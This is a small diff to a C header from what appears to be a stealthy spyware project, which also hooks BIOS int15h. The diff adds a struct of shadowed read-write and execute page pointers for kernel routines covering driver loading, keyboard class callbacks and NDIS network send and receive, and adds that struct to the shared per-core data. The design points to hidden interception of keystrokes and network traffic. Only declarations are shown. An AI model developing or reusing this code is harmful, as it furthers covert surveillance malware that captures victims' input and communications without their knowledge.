@@ -29,6 +29,17 @@ typedef struct {
 } spyware_data_t;
 
 typedef struct {
+    byte_t *MiDriverLoadSucceeded_rw;
+    byte_t *MiDriverLoadSucceeded_x;
+    byte_t *KeyboardClassServiceCallback_rw;
+    byte_t *KeyboardClassServiceCallback_x;
+    byte_t *ndisMSendNBLToMiniportInternal_rw;
+    byte_t *ndisMSendNBLToMiniportInternal_x;
+    byte_t *NdisMIndicateReceiveNetBufferLists_rw;
+    byte_t *NdisMIndicateReceiveNetBufferLists_x;
+} memory_shadowing_pages_t;
+
+typedef struct {
     word_t int15h_segment;
     word_t int15h_offset;
     dword_t allocation_lock;
@@ -46,6 +57,7 @@ typedef struct {
     BOOL send_requests;
     dword_t spyware_data_lock;
     spyware_data_t spyware_data_buffer;
+    memory_shadowing_pages_t memory_shadowing_pages;
 } shared_cores_data_t;
 
 #define MAX_BUFFER_LENGTH 213
